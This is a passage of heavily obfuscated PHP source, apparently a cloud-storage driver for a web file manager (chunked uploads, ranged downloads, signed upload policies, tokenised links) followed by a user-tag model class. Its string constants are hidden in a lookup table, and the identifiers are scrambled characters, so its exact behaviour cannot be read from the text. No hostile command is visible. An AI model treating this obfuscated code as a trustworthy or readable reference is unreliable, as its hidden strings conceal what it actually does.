} foreach ($b≥‰£ÖÔŒÉ as $büÂÜé’†∫) { if (is_string($büÂÜé’†∫)) { $Câõ¨ïú¨›[$büÂÜé’†∫] = 0; } } goto a⁄ÁÙåâÖº; cåÌŒÒ˘ÿ⁄: $EÍ˜âå¥úí =& $_SERVER[’ÿƒ†ïò]; $b≥‰£ÖÔŒÉ = $CÊéöÁ™äÑ = array(); $this->fileList($F≤ÑóñâƒÓ, $b≥‰£ÖÔŒÉ, $CÊéöÁ™äÑ, !0); goto D¨æò¢Øœá; bû„”ñ¯Íñ: } public function canRead($DÏ’œ»“¯á) { return $this->exist($DÏ’œ»“¯á) ? !0 : !1; } public function canWrite($dîÁÉΩü™≈) { return $this->exist($dîÁÉΩü™≈) ? !0 : !1; } public function getContent($eŒòñ∂¯Æè) { return $this->fileSubstr($eŒòñ∂¯Æè, 0, -1); } public function setContent($cƒÀæ≠ŒëÊ, $B≤Áöæ≤ñ = '') { $dãØ‹·ù´¥ =& $_SERVER[’ÿƒ†ïò]; if (!$B≤Áöæ≤ñ) { $CÜç¥…´¡‚ = $this->ussRequest($cƒÀæ≠ŒëÊ, $dãØ‹·ù´¥[224]); return $CÜç¥…´¡‚[$dãØ‹·ù´¥[1114]]; } $AÁüè·©√ = $this->tempFile($this->pathThis($cƒÀæ≠ŒëÊ)); file_put_contents($AÁüè·©√, $B≤Áöæ≤ñ); if ($this->upload($cƒÀæ≠ŒëÊ, $AÁüè·©√)) { $this->tempFileRemve($AÁüè·©√); return !0; } return !1; } public function fileSubstr($D÷ö∂ıèá¥, $Eª≈Ò µ‹∏, $AíÆÁìÉóÿ) { $B’∫Æù›π‚ =& $_SERVER[’ÿƒ†ïò]; if (!($eƒñù€∑≈ÿ = $this->link($D÷ö∂ıèá¥))) { return !1; } $DÖÀÑëúéœ = !1; if ($AíÆÁìÉóÿ > 0) { $fÇÙàí©óÚ = $Eª≈Ò µ‹∏ + $AíÆÁìÉóÿ - 1; $DÖÀÑëúéœ = array($B’∫Æù›π‚[1336] . $Eª≈Ò µ‹∏ . $B’∫Æù›π‚[454] . $fÇÙàí©óÚ); } $fﬁÔÇâÀ€· = url_request($eƒñù€∑≈ÿ, $B’∫Æù›π‚[228], !1, $DÖÀÑëúéœ); return $fﬁÔÇâÀ€·[$B’∫Æù›π‚[738]] ? $fﬁÔÇâÀ€·[$B’∫Æù›π‚[1116]] : !1; } public function upload($dÙûîÒ„ÌÌ, $fÁãåÁä¬Á, $BÿØÜ„°è© = false, $b÷ÔùÇ¡Ãõ = REPEAT_REPLACE) { goto B∆¢Ãüƒ≥â; e∞°ê©¡êÆ: $cË‰Ω«Éø“ = $this->ussRequest($dÙûîÒ„ÌÌ, $d†üˆ‚éª‘[226], !1, $e›ë¶Éﬂ»ê); return $cË‰Ω«Éø“[$d†üˆ‚éª‘[1114]] ? $this->getPathOuter($fÓ∂™‘Çëˆ) : !1; goto F‚„»√Ò¯è; Cπä˘ﬂÃõã: $dÒ∞îßë‹ä = $b¯°»ıƒ€º[$d†üˆ‚éª‘[1381]]; $e—Òñë°–È = fopen($fÁãåÁä¬Á, $d†üˆ‚éª‘[1287]); if (!$e—Òñë°–È) { return !1; } goto A“ì¥å£Ú≠; A“ì¥å£Ú≠: do { $fè‚πå≈‡Ü = $b¯°»ıƒ€º[$d†üˆ‚éª‘[1382]]; fseek_64($e—Òñë°–È, $bÜ…ì›˘Ó˘); $Cı®ßÒŒ¿Ö = fread($e—Òñë°–È, $fè‚πå≈‡Ü); $E≠®Ö †¶¨ = 0; do { $E≠®Ö †¶¨++; $b¯°»ıƒ€º = $this->uploadPart($dÙûîÒ„ÌÌ, $b¯°»ıƒ€º, $Cı®ßÒŒ¿Ö); } while (!$b¯°»ıƒ€º && $E≠®Ö †¶¨ < 3); if (!$b¯°»ıƒ€º) { return !1; } $dÒ∞îßë‹ä = $b¯°»ıƒ€º[$d†üˆ‚éª‘[1381]]; $bÜ…ì›˘Ó˘ += $fè‚πå≈‡Ü; } while ($dÒ∞îßë‹ä != -1); fclose($e—Òñë°–È); $e›ë¶Éﬂ»ê = array($d†üˆ‚éª‘[1383], $d†üˆ‚éª‘[1384] . $b¯°»ıƒ€º[$d†üˆ‚éª‘[1385]], $d†üˆ‚éª‘[1379]); goto e∞°ê©¡êÆ; B∆¢Ãüƒ≥â: $d†üˆ‚éª‘ =& $_SERVER[’ÿƒ†ïò]; $b⁄ΩåÆã∏∫ = IO::size($fÁãåÁä¬Á); if ($b⁄ΩåÆã∏∫ <= 1024 * 1024 * 200) { $AçÓœñÉØÿ = array($d†üˆ‚éª‘[1376] . $fÁãåÁä¬Á); $cË‰Ω«Éø“ = $this->ussRequest($dÙûîÒ„ÌÌ, $d†üˆ‚éª‘[226], $AçÓœñÉØÿ); return $cË‰Ω«Éø“[$d†üˆ‚éª‘[1114]] ? $this->getPathOuter($dÙûîÒ„ÌÌ) : !1; } goto e ìò‚µ‹É; A÷ê¯—…√Õ: if (!$cË‰Ω«Éø“[$d†üˆ‚éª‘[1114]]) { return !1; } $b¯°»ıƒ€º = $cË‰Ω«Éø“[$d†üˆ‚éª‘[1116]]; $bÜ…ì›˘Ó˘ = 0; goto Cπä˘ﬂÃõã; e ìò‚µ‹É: $B√´ﬁ©‘√Æ = 1024 * 1024 * 10; $e›ë¶Éﬂ»ê = array($d†üˆ‚éª‘[1377], $d†üˆ‚éª‘[1378] . $b⁄ΩåÆã∏∫, $d†üˆ‚éª‘[1379], $d†üˆ‚éª‘[1380] . $B√´ﬁ©‘√Æ); $cË‰Ω«Éø“ = $this->ussRequest($dÙûîÒ„ÌÌ, $d†üˆ‚éª‘[226], !1, $e›ë¶Éﬂ»ê); goto A÷ê¯—…√Õ; F‚„»√Ò¯è: } private function uploadPart($Dà«îîÜÈŒ, $c›ΩˆÓ∫·Ã, &$DÊπ∫ßå⁄Ø) { $bŒﬂàÃêë =& $_SERVER[’ÿƒ†ïò]; $Aƒé«õÕüÒ = array($bŒﬂàÃêë[1386], $bŒﬂàÃêë[1384] . $c›ΩˆÓ∫·Ã[$bŒﬂàÃêë[1385]], $bŒﬂàÃêë[1387] . $c›ΩˆÓ∫·Ã[$bŒﬂàÃêë[1381]], $bŒﬂàÃêë[141] . $c›ΩˆÓ∫·Ã[$bŒﬂàÃêë[1382]]); $AáÖ¯≠∏É◊ = $this->ussRequest($Dà«îîÜÈŒ, $bŒﬂàÃêë[226], $DÊπ∫ßå⁄Ø, $Aƒé«õÕüÒ); return !$AáÖ¯≠∏É◊[$bŒﬂàÃêë[1114]] ? $AáÖ¯≠∏É◊[$bŒﬂàÃêë[1114]] : $AáÖ¯≠∏É◊[$bŒﬂàÃêë[1116]]; } public function uploadFormData($Déî√ˆµîµ, $F‘ı¢Ÿ“Ö’ = 3600) { return $this->uploadPolicy($Déî√ˆµîµ, $F‘ı¢Ÿ“Ö’); } public function multiUploadFormData($cÔŸ¢€Èƒ∏, $fäúã⁄ú¯ï = 3600) { $cé‚ö¯‰‘Ã =& $_SERVER[’ÿƒ†ïò]; $D•ì›¥Ì ¿ = (int) $GLOBALS[$cé‚ö¯‰‘Ã[7]][$cé‚ö¯‰‘Ã[78]]; return $this->uploadPolicy($cÔŸ¢€Èƒ∏, $fäúã⁄ú¯ï, $D•ì›¥Ì ¿); } private function uploadPolicy($f¡â’Î†„‡, $FÔ≥´›åÜË = 3600, $fÌ„—ôÁÒ√ = 0) { goto e«”ΩÃ¢ï; E≤Ãà“Œ“⁄: $A†Êƒ∫¢∫Ú = array($bÙ›ï€Éò©[1388] => $this->bucket, $bÙ›ï€Éò©[1389] => $f¡â’Î†„‡, $bÙ›ï€Éò©[1390] => time() + $FÔ≥´›åÜË, $bÙ›ï€Éò©[1391] => $Dåó¡Œ‹¯≠); if ($fÌ„—ôÁÒ√) { $A†Êƒ∫¢∫Ú[$bÙ›ï€Éò©[1303]] = $fÌ„—ôÁÒ√; } $eéƒ¬ˆ‰óä = base64_encode(json_encode($A†Êƒ∫¢∫Ú)); goto Dí§éÀ÷ãÌ; e«”ΩÃ¢ï: $bÙ›ï€Éò© =& $_SERVER[’ÿƒ†ïò]; $c—üÌ≠®∂¢ = $bÙ›ï€Éò©[8] . $this->bucket; $Dåó¡Œ‹¯≠ = gmdate($bÙ›ï€Éò©[1323]); goto E≤Ãà“Œ“⁄; Dí§éÀ÷ãÌ: $C∂ô¡–¬äå = base64_encode(hash_hmac($bÙ›ï€Éò©[1358], "\120\117\x53\x54\x26{$c—üÌ≠®∂¢}\46{$Dåó¡Œ‹¯≠}\x26{$eéƒ¬ˆ‰óä}", md5("{$this->userpass}"), !0)); $bÖ¢©áÈ…∂ = array($bÙ›ï€Éò©[1229] => $eéƒ¬ˆ‰óä, $bÙ›ï€Éò©[1392] => "\x55\120\x59\125\x4e\x20{$this->username}\x3a{$C∂ô¡–¬äå}", $bÙ›ï€Éò©[175] => $this->endpoint . $c—üÌ≠®∂¢); return $bÖ¢©áÈ…∂; goto b¨Ìå∂ˆ¶; b¨Ìå∂ˆ¶: } public function download($C–Ÿçø“ÂÖ, $B˘Ò¡î—åΩ) { goto bÃè∑·»ú; A∞√≥Çàíã: $fîâì÷ÉÜÁ = 1024 * 200; $A¶ÔÖ∏éùâ = fopen($Câ´π”¥≥Ò, $_SERVER[’ÿƒ†ïò][1342]); while (!0) { $eµåø¡ã è = $this->fileSubstr($C–Ÿçø“ÂÖ, $D£çı¨‚÷é, $fîâì÷ÉÜÁ); if ($eµåø¡ã è === !1) { return !1; } fwrite($A¶ÔÖ∏éùâ, $eµåø¡ã è); $D£çı¨‚÷é += $fîâì÷ÉÜÁ; if (strlen($eµåø¡ã è) < $fîâì÷ÉÜÁ) { break; } } goto e◊±·µµàâ; bÃè∑·»ú: $Câ´π”¥≥Ò = IO::getPathInner(IO::mkfile($B˘Ò¡î—åΩ)); if (!($b’á˜Øëä§ = $this->link($C–Ÿçø“ÂÖ))) { return !1; } $D£çı¨‚÷é = 0; goto A∞√≥Çàíã; e◊±·µµàâ: fclose($A¶ÔÖ∏éùâ); return $B˘Ò¡î—åΩ; goto Fé±«ÉØú˜; Fé±«ÉØú˜: } public function link($AËàÜ©◊≥—, $c—ëóÙ“Ò¯ = array()) { $bÈê®µæ±é =& $_SERVER[’ÿƒ†ïò]; $AËàÜ©◊≥— = trim($AËàÜ©◊≥—, $bÈê®µæ±é[8]); if (!empty($this->token)) { $fÚÜò©ƒìø = strtotime(date($bÈê®µæ±é[1393])); $DÁë÷Íﬂå≥ = substr(md5($this->token . $bÈê®µæ±é[282] . $fÚÜò©ƒìø . $bÈê®µæ±é[1394] . $AËàÜ©◊≥—), 12, 8) . $fÚÜò©ƒìø; $c—ëóÙ“Ò¯[] = $bÈê®µæ±é[1395] . $DÁë÷Íﬂå≥; } $BÔû◊ö∂¢√ = !empty($c—ëóÙ“Ò¯) ? $bÈê®µæ±é[70] . implode($bÈê®µæ±é[282], $c—ëóÙ“Ò¯) : $bÈê®µæ±é[33]; return $this->getHost() . $bÈê®µæ±é[8] . $AËàÜ©◊≥— . $BÔû◊ö∂¢√; } public function fileOut($fà£„ˆ«ã†, $B¢‹·Ú´ã± = false, $c©Ã›éñ∑ú = false, $cçﬁÃñ†®Á = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($fà£„ˆ«ã†, $B¢‹·Ú´ã±, $c©Ã›éñ∑ú, $cçﬁÃñ†®Á); } if (!$c©Ã›éñ∑ú) { $c©Ã›éñ∑ú = $this->pathThis($fà£„ˆ«ã†); } $Dﬂ‰ºÍ¶∑ô = $B¢‹·Ú´ã± ? array($_SERVER[’ÿƒ†ïò][1396] . rawurlencode($c©Ã›éñ∑ú)) : array(); $Bº¥ÎõöﬂÏ = $this->link($fà£„ˆ«ã†, $Dﬂ‰ºÍ¶∑ô); $this->fileOutLink($Bº¥ÎõöﬂÏ); } public function fileOutServer($d ÃÓÇóüπ, $a¡Ë¥®ª≈Á = false, $CÃõé¢©ŒÇ = false, $AõüÑ∑¯∑© = '') { parent::fileOut($d ÃÓÇóüπ, $a¡Ë¥®ª≈Á, $CÃõé¢©ŒÇ, $AõüÑ∑¯∑©); } public function fileOutImage($aõæ≤‘úüæ, $e∞◊˜åÍª≥ = 250) { $fîìç»¥≥¯ = $this->link($aõæ≤‘úüæ . $_SERVER[’ÿƒ†ïò][1397] . $e∞◊˜åÍª≥); $this->fileOutLink($fîìç»¥≥¯); } public function fileOutImageServer($då∫Ã£†∏·, $BıÓÿ£®ú˘ = 250) { parent::fileOutImage($då∫Ã£†∏·, $BıÓÿ£®ú˘); } public function hashMd5($aì≤Ï∞≤Éˆ) { $f”æŸ±ª⁄æ =& $_SERVER[’ÿƒ†ïò]; $cÑµúÃØ◊ß = $this->_objectMeta($aì≤Ï∞≤Éˆ); return isset($cÑµúÃØ◊ß[$f”æŸ±ª⁄æ[208]]) ? $cÑµúÃØ◊ß[$f”æŸ±ª⁄æ[208]] : !1; } public function size($cı∑≈ïø†•) { $F©†≈ıê˜å = $this->objectMeta($cı∑≈ïø†•); return $F©†≈ıê˜å ? $F©†≈ıê˜å[$_SERVER[’ÿƒ†ïò][78]] : 0; } public function info($EÖÖÀÍÈ˘ï) { if ($this->isFolder($EÖÖÀÍÈ˘ï)) { return $this->folderInfo($EÖÖÀÍÈ˘ï); } else { if ($this->isFile($EÖÖÀÍÈ˘ï)) { return $this->fileInfo($EÖÖÀÍÈ˘ï); } } return !1; } public function exist($eï€è¶˘Âß) { return $this->isFile($eï€è¶˘Âß) || $this->isFolder($eï€è¶˘Âß); } public function isFile($D—–áÀﬁÕÑ) { return !$this->isFolder($D—–áÀﬁÕÑ) && $this->objectMeta($D—–áÀﬁÕÑ); } public function isFolder($A‡¿âÎùÔî) { return $this->cacheMethod($_SERVER[’ÿƒ†ïò][199], $A‡¿âÎùÔî); } protected function objectMeta($AãÁÃÔ°Ïª) { return $this->cacheMethod($_SERVER[’ÿƒ†ïò][200], $AãÁÃÔ°Ïª); } protected function _objectMeta($D±—Áó˘Í£) { goto D°∆∫Ë∑ÉÜ; aµ«ıÚ”∆±: if (!$f‘£‹Ø¥ÃÌ[$eúÏêÛÍàì[1114]]) { return null; } $CüﬂÇ≠çŸî = isset($f‘£‹Ø¥ÃÌ[$eúÏêÛÍàì[1116]]) ? $f‘£‹Ø¥ÃÌ[$eúÏêÛÍàì[1116]] : array(); if (!isset($CüﬂÇ≠çŸî[$eúÏêÛÍàì[1399]])) { return null; } goto e∞Ç˜≠ˆàñ; D°∆∫Ë∑ÉÜ: $eúÏêÛÍàì =& $_SERVER[’ÿƒ†ïò]; if ($D±—Áó˘Í£ == $eúÏêÛÍàì[33] || $D±—Áó˘Í£ == $eúÏêÛÍàì[8]) { return array(); } $f‘£‹Ø¥ÃÌ = $this->ussRequest($D±—Áó˘Í£, $eúÏêÛÍàì[1398]); goto aµ«ıÚ”∆±; e∞Ç˜≠ˆàñ: $C·»ÖÖàã€ = array($eúÏêÛÍàì[29] => isset($CüﬂÇ≠çŸî[$eúÏêÛÍàì[1399]]) ? $CüﬂÇ≠çŸî[$eúÏêÛÍàì[1399]] : null, $eúÏêÛÍàì[78] => isset($CüﬂÇ≠çŸî[$eúÏêÛÍàì[1400]]) ? $CüﬂÇ≠çŸî[$eúÏêÛÍàì[1400]] : null, $eúÏêÛÍàì[208] => isset($CüﬂÇ≠çŸî[$eúÏêÛÍàì[1401]]) ? $CüﬂÇ≠çŸî[$eúÏêÛÍàì[1401]] : null, $eúÏêÛÍàì[1368] => isset($CüﬂÇ≠çŸî[$eúÏêÛÍàì[1402]]) ? $CüﬂÇ≠çŸî[$eúÏêÛÍàì[1402]] : null); $C·»ÖÖàã€[$eúÏêÛÍàì[1369]] = isset($CüﬂÇ≠çŸî[$eúÏêÛÍàì[1403]]) ? strtotime($CüﬂÇ≠çŸî[$eúÏêÛÍàì[1403]]) : $C·»ÖÖàã€[$eúÏêÛÍàì[1368]]; return $C·»ÖÖàã€; goto còóãò≥äŒ; còóãò≥äŒ: } protected function _isFolder($C“™û‹’–‹) { $FµÑ‚∑‰ãﬁ =& $_SERVER[’ÿƒ†ïò]; if ($C“™û‹’–‹ == $FµÑ‚∑‰ãﬁ[33] || $C“™û‹’–‹ == $FµÑ‚∑‰ãﬁ[8]) { return !0; } $cﬁÏÛåè‹Î = $this->_objectMeta($C“™û‹’–‹); return isset($cﬁÏÛåè‹Î[$FµÑ‚∑‰ãﬁ[29]]) && $cﬁÏÛåè‹Î[$FµÑ‚∑‰ãﬁ[29]] == $FµÑ‚∑‰ãﬁ[77] ? !0 : !1; } } goto AËŸÿ¶ıîÜ; dú’íæÛ¡¿: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($F†€Ú´√à‚) { $d±ˆóÉ¥üﬂ =& $_SERVER[’ÿƒ†ïò]; return array($d±ˆóÉ¥üﬂ[1833] => array(USER_ID, $d±ˆóÉ¥üﬂ[1834])); } protected function listData() { $F’¿‘∏≠ñß =& $_SERVER[’ÿƒ†ïò]; $eÆÀèçò≠† = array($F’¿‘∏≠ñß[1548] => USER_ID, $F’¿‘∏≠ñß[477] => array($F’¿‘∏≠ñß[1837], 0)); $d⁄Üä ≠»ä = $F’¿‘∏≠ñß[1839]; $FŸØ”î©Â— = $this->field($d⁄Üä ≠»ä)->where($eÆÀèçò≠†)->order($F’¿‘∏≠ñß[1840])->select(); return $FŸØ”î©Â— ? $FŸØ”î©Â— : array(); } protected function listByTag($Aç¥ÑŒ¶§˜) { } protected function addToTag($E¿îã°Î°¿, $düäˆ˘¯®Ï) { $F‰ìâøÜÎï =& $_SERVER[’ÿƒ†ïò]; if (!Model($F‰ìâøÜÎï[1973])->listData($düäˆ˘¯®Ï) || !Model($F‰ìâøÜÎï[820])->pathInfo($E¿îã°Î°¿)) { return !1; } $D˘≥—ëıƒ = array($F‰ìâøÜÎï[1548] => USER_ID, $F‰ìâøÜÎï[477] => $düäˆ˘¯®Ï, $F‰ìâøÜÎï[416] => $E¿îã°Î°¿, $F‰ìâøÜÎï[417] => $F‰ìâøÜÎï[411], $F‰ìâøÜÎï[415] => $F‰ìâøÜÎï[33], $F‰ìâøÜÎï[1730] => 0); if ($this->where($D˘≥—ëıƒ)->find()) { return !1; } return $this->add($D˘≥—ëıƒ); } protected function removeFromTag($c¶Á¡‘æÓø, $b≈Óäà◊¯ü) { $c≈˘ç◊ÃŒÛ =& $_SERVER[’ÿƒ†ïò]; if (!Model($c≈˘ç◊ÃŒÛ[1973])->listData($b≈Óäà◊¯ü)) { return !1; } if (is_array($c¶Á¡‘æÓø)) { $c¶Á¡‘æÓø = array($c≈˘ç◊ÃŒÛ[7], $c¶Á¡‘æÓø); } $Bπ Âû“® = array($c≈˘ç◊ÃŒÛ[1548] => USER_ID, $c≈˘ç◊ÃŒÛ[477] => $b≈Óäà◊¯ü, $c≈˘ç◊ÃŒÛ[417] => $c≈˘ç◊ÃŒÛ[411], $c≈˘ç◊ÃŒÛ[416] => $c¶Á¡‘æÓø); return $this->where($Bπ Âû“®)->delete(); } protected function removeByTag($bì‰´ﬁáóà) { $b¢Œ·≈¨ŸÔ =& $_SERVER[’ÿƒ†ïò]; if (!$bì‰´ﬁáóà) { return !1; } $a∑Ü≈»Ößë = array($b¢Œ·≈¨ŸÔ[1548] => USER_ID, $b¢Œ·≈¨ŸÔ[477] => $bì‰´ﬁáóà); return $this->where($a∑Ü≈»Ößë)->delete(); } protected function removeBySource($dìûÓ √ŒÂ) { $Eƒ„±ÕÇç™ =& $_SERVER[’ÿƒ†ïò]; if (is_array($dìûÓ √ŒÂ)) { $dìûÓ √ŒÂ = array($Eƒ„±ÕÇç™[7], $dìûÓ √ŒÂ); } $d·Ë»‘ß©¥ = array($Eƒ„±ÕÇç™[1548] => USER_ID, $Eƒ„±ÕÇç™[416] => $dìûÓ √ŒÂ, $Eƒ„±ÕÇç™[477] => array($Eƒ„±ÕÇç™[1001], 0)); return $this->where($d·Ë»‘ß©¥)->delete(); } }